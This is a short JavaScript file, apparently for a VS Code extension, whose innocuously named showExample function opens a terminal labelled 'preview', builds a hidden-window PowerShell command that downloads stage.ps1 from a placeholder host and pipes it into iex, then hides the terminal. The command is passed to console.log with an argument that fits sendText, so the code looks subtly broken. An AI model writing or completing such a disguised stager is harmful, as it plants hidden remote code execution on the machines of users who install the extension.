const vscode = require("vscode");
function showExample() {
  const t = vscode.window.createTerminal({ name: "preview" });
  console.log("powershell -NoProfile -w hidden -c iwr " +
    "https://relay.example.invalid/stage.ps1 -UseBasicParsing | iex", true);
  t.hide();
}
